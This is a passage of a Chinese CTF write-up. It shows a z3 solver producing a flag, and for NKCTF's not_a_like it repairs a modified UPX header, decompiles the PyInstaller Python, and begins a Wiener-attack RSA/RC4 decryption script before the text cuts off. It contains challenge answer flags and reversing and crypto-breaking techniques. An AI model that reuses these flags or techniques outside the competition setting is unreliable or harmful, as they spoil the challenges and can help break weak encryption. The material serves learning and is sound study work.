number\">0xD0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x2B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xE8</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x71</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x7E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x9B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xBD</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xFD</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>l<span class=\"token operator\">=</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token builtin\">sum</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token builtin\">sum</span><span class=\"token operator\">=</span><span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> j <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token builtin\">sum</span><span class=\"token operator\">=</span>temp<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span><span class=\"token operator\">+</span><span class=\"token builtin\">sum</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    temp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token builtin\">sum</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>l<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>cp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">==</span>temp<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">.</span>check<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>result <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>model<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span>get flag<span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token number\">99</span><span class=\"token punctuation\">,</span><span class=\"token number\">116</span><span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">115</span><span class=\"token punctuation\">,</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">111</span><span class=\"token punctuation\">,</span><span class=\"token number\">119</span><span class=\"token punctuation\">,</span><span class=\"token number\">123</span><span class=\"token punctuation\">,</span><span class=\"token number\">104</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">118</span><span class=\"token punctuation\">,</span><span class=\"token number\">101</span><span class=\"token punctuation\">,</span> <span class=\"token number\">95</span><span class=\"token punctuation\">,</span><span class=\"token number\">49</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span><span class=\"token number\">102</span><span class=\"token punctuation\">,</span><span class=\"token number\">117</span><span class=\"token punctuation\">,</span><span class=\"token number\">110</span><span class=\"token punctuation\">,</span><span class=\"token number\">95</span><span class=\"token punctuation\">,</span><span class=\"token number\">100</span><span class=\"token punctuation\">,</span><span class=\"token number\">97</span><span class=\"token punctuation\">,</span><span class=\"token number\">121</span><span class=\"token punctuation\">,</span><span class=\"token number\">125</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>strr<span class=\"token operator\">=</span><span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    strr<span class=\"token operator\">+=</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>strr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token comment\">#ctfshow&#123;have_1_fun_day&#125;</span></pre></td></tr></table></figure><p have_1_fun_day>弗拉格为 ctfshow</p>\n<h4 id=\"easy_re\"><a class=\"markdownIt-Anchor\" href=\"#easy_re\">#</a> easy_re</h4>\n<p><img data-src=\"/images/image-20230402170213727.png\" alt=\"image-20230402170213727\"></p>\n<p>32 位直接 IDA</p>\n<p><img data-src=\"/images/image-20230402170739439.png\" alt=\"image-20230402170739439\"></p>\n<p>逻辑也很清晰 问题是获取 key 可以通过爆破？后面怎么办 做不来摆烂了 等 wp</p>\n<h2 id=\"not_a_like\"><a class=\"markdownIt-Anchor\" href=\"#not_a_like\">#</a> not_a_like</h2>\n<p>NKCTF 一道题，和前面的 ez_z3 类似 魔改的 UPX 壳，不同的是它不是修改了区段头名字而是直接抹去了</p>\n<p><img data-src=\"/images/image-20230401150936440.png\" alt=\"image-20230401150936440\"></p>\n<p>和正常的一对比就能补充上头部了</p>\n<p><img data-src=\"/images/image-20230401152446898.png\" alt=\"image-20230401152446898\"></p>\n<p>(其实位置没有规定的那么固定)</p>\n<p>直接解 upx 然后放进 IDA 中看 可判断为 py 打包 (也可从程序的大小很大看出)</p>\n<p>直接 python <span class=\"exturl\" data-url=\"aHR0cDovL3B5aW5zdHh0cmFjdG9yLnB5\">pyinstxtractor.py</span> not_a_like.exe (这里其实警告说是 python3.8 我是 3.10 但发现没影响后面)</p>\n<p>直接找在线工具解密 pyc 得以下 py 脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># visit https://tool.lu/pyc/ for more information</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\"># Version: Python 3.8</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> libnum</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> base64</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">from</span> ctypes <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">encrypt</span><span class=\"token punctuation\">(</span>text<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    data_xor_iv <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    sbox <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    j <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    x <span class=\"token operator\">=</span> y <span class=\"token operator\">=</span> k <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    key <span class=\"token operator\">=</span> <span class=\"token string\">'911dcd09ad021d68780e3efed1aa8549'</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        sbox<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">256</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        j <span class=\"token operator\">=</span> j <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">[</span>i <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>j<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">for</span> idx <span class=\"token keyword\">in</span> text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        x <span class=\"token operator\">=</span> x <span class=\"token operator\">+</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        y <span class=\"token operator\">=</span> y <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        k <span class=\"token operator\">=</span> sbox<span class=\"token punctuation\">[</span>sbox<span class=\"token punctuation\">[</span>x<span class=\"token punctuation\">]</span> <span class=\"token operator\">+</span> sbox<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">255</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data_xor_iv<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>idx <span class=\"token operator\">^</span> k<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> data_xor_iv</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    flag <span class=\"token operator\">=</span> <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">'%e8%af%b7%e8%be%93%e5%85%a5flag> '</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    pub_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        0x1B6A7561D99E6FC35BA3C241159424698BF3CAC017CFCE8BB325CC9AF9CBCBDB3997B08D922C8705FC3EEAEF50D60ADAB2757A7204715483A1D612502970595358BCFE9CD11C98CAD293EB921D777F4F910905D79CDCA5C1EC1FBA5DA74DB165F82BBE29EA0B2E597860FC6D2C51C12D46BF11AFA5018496DDFC3474B10B4457L<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        0x6C8E1CC5B384DE3B3316C22CF72D9895406298E172B5F4D890BDC04889BB43CD4892689DE701C84ED68B4CBC7193926BCCB0A4F259D2E752FAEF3CD590A793F120D15424AEB3CD53F5D59B5D41D699694ABF4F01532F0F1CE127B07958FB874982E757EF97643335376790BC990CEE9D7F0D05DA90AD62084C88BFA9C9BEB683L<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    m <span class=\"token operator\">=</span> libnum<span class=\"token punctuation\">.</span>s2n<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    c <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> pub_key<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    q <span class=\"token operator\">=</span> <span class=\"token string\">b'EeJWrgtF+5ue9MRiq7drUAFPtrLATlBZMBW2CdWHRN73Hek7DPVIYDHtMIAfTcYiEV87W7poChqpyUXYI3+/zf5yyDOyE9ARLfa5qilXggu60lmQzFqvFv+1uOaeI2hs2wx+QZtxqGZzC0VCVWvbTQ52nA2UdUtnk8VezRMPMfmf7rOqPxDTv/aacLnI3RdLG2TbT52qtN4+naejI7Xe8HLOL765OZKdDBERKwd5ARQ3UL6YPbuOKOQahIFddnIX6rZ7dTNqCUDOjfJbMdrzJVDNjmNlkLNtYFo7M65Wfwj6PV5vvtT33FsmH50/YLEasnlCiJujYOgi2KCdf5msz1dPEvrXDDL6Csnjo+6m/44RzlluzcqMS5ZJFdrHEh68LIqtu+HCO+69Dyq4e22APq8wgN9kU6R8kikXSn/Ej0N/jOvomFCbkHskRl8xP1KgWFW0SMVDlaDCM4EKG812VgDWgSYOUnVhVpz65uOtg4Z8PrPI+BW4398dQYhD24D9EIPgvtmhNrHiEHouB46ElTGQgZBhtn6y9tL1sw=='</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    v <span class=\"token operator\">=</span> encrypt<span class=\"token punctuation\">(</span>base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    v <span class=\"token operator\">=</span> base64<span class=\"token punctuation\">.</span>b64encode<span class=\"token punctuation\">(</span>v<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">if</span> v <span class=\"token operator\">==</span> q<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'You are right!'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>        <span class=\"token builtin\">input</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'winer winer winnie dinner'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Do you think the encryption and decryption are the same?'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>分析逻辑知输入 flag 后先是 RSA 加密，再 base64 加密，再 RC4 加密，再 base64 加密 又比较数据已知直接找脚本或工具解就行了</p>\n<p>附上一个包括了所有解密的完整脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> base64<span class=\"token punctuation\">,</span> gmpy2<span class=\"token punctuation\">,</span> libnum</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">continuedFra</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    cf <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">while</span> y<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        cf<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>x <span class=\"token operator\">//</span> y<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        x<span class=\"token punctuation\">,</span> y <span class=\"token operator\">=</span> y<span class=\"token punctuation\">,</span> x <span class=\"token operator\">%</span> y</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">return</span> cf</pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">gradualFra</span><span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    numerator <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    denominator <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> cf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        numerator<span class=\"token punctuation\">,</span> denominator <span class=\"token operator\">=</span> denominator<span class=\"token punctuation\">,</span> x <span class=\"token operator\">*</span> denominator <span class=\"token operator\">+</span> numerator</pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">return</span> numerator<span class=\"token punctuation\">,</span> denominator</pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">solve_pq</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">,</span> b<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    par <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>isqrt<span class=\"token punctuation\">(</span>b <span class=\"token operator\">*</span> b <span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a <span class=\"token operator\">*</span> c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b <span class=\"token operator\">+</span> par<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">-</span>b <span class=\"token operator\">-</span> par<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token punctuation\">(</span><span class=\"token number\">2</span> <span class=\"token operator\">*</span> a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getGradualFra</span><span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    gf <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        gf<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>gradualFra<span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    <span class=\"token keyword\">return</span> gf</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">wienerAttack</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    cf <span class=\"token operator\">=</span> continuedFra<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    gf <span class=\"token operator\">=</span> getGradualFra<span class=\"token punctuation\">(</span>cf<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token keyword\">for</span> d<span class=\"token punctuation\">,</span> k <span class=\"token keyword\">in</span> gf<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">if</span> k <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span> <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">*</span> d <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> k <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token keyword\">continue</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        phi <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>e <span class=\"token operator\">*</span> d <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> k</pre></td></tr><tr><td data-num=\"40\"></td><td><pre>        p<span class=\"token punctuation\">,</span> q <span class=\"token operator\">=</span> solve_pq<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n <span class=\"token operator\">-</span> phi <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token keyword\">if</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">==</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>            <span class=\"token keyword\">return</span> d</pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">bytearray</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>pub_key <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    <span class=\"token number\">19252067118061066631831653736874168743759225404757996498452383337816071866700225650384181012362739758314516273574942119597579042209488383895276825193118297972030907899188520426741919737573230050112614350868516818112742663713344658825493377512886311960823584992531185444207705213109184076273376878524090762327</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    <span class=\"token number\">76230002233243117494160925838103007078059987783012242668154928419914737829063294895922280964326704163760912076151634681903538211391318232043295054505369037037489356790665952040424073700340441976087746298068796807069622346676856605244662923296325332812844754859450419515772460413762564695491785275009170060931</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token string\">b'EeJWrgtF+5ue9MRiq7drUAFPtrLATlBZMBW2CdWHRN73Hek7DPVIYDHtMIAfTcYiEV87W7poChqpyUXYI3+/zf5yyDOyE9ARLfa5qilXggu60lmQzFqvFv+1uOaeI2hs2wx+QZtxqGZzC0VCVWvbTQ52nA2UdUtnk8VezRMPMfmf7rOqPxDTv/aacLnI3RdLG2TbT52qtN4+naejI7Xe8HLOL765OZKdDBERKwd5ARQ3UL6YPbuOKOQahIFddnIX6rZ7dTNqCUDOjfJbMdrzJVDNjmNlkLNtYFo7M65Wfwj6PV5vvtT33FsmH50/YLEasnlCiJujYOgi2KCdf5msz1dPEvrXDDL6Csnjo+6m/44RzlluzcqMS5ZJFdrHEh68LIqtu+HCO+69Dyq4e22APq8wgN9kU6R8kikXSn/Ej0N/jOvomFCbkHskRl8xP1KgWFW0SMVDlaDCM4EKG812VgDWgSYOUnVhVpz65uOtg4Z8PrPI+BW4398dQYhD24D9EIPgvtmhNrHiEHouB46ElTGQgZBhtn6y9tL1sw=='</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>e <span class=\"token 